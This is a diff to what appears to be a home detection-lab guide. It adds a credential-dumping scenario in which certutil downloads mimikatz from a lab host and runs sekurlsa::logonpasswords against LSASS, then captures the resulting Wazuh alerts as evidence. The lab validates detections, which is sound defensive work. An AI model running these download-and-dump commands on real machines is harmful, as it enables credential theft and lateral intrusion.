@@ -125,6 +125,36 @@ sudo grep '"id":"100100"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
 
 ---
 
+## Scenario 05 — Credential dumping (Mimikatz / LSASS)
+
+**Attack (Windows, in the compromised session; tool served from Kali with
+`python3 -m http.server 80`):**
+```powershell
+# fetch the tool, renamed on disk to prove detection isn't name-based
+certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
+# dump credentials from LSASS
+C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
+**Capture the behavioral alert — rule 92900, the validated detection (manager):**
+```bash
+mkdir -p evidence/scenario-05-creddump
+sudo grep '"id":"92900"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-05-creddump/wazuh-92900-alert.json
+```
+
+**Optional — capture the custom name-based rule 100002 (manager):**
+```bash
+sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
+  > evidence/scenario-05-creddump/wazuh-100002-alert.json
+```
+
+**Screenshots:** the 92900 alert list and the detail showing
+`sourceImage: m.exe → targetImage: lsass.exe`, `grantedAccess: 0x1010`, and MITRE
+T1003.001 → `evidence/scenario-05-creddump/`.
+
+---
+
 ## Redaction reminder
 
 Before committing, scrub any public cloud IPs or credentials from the captured
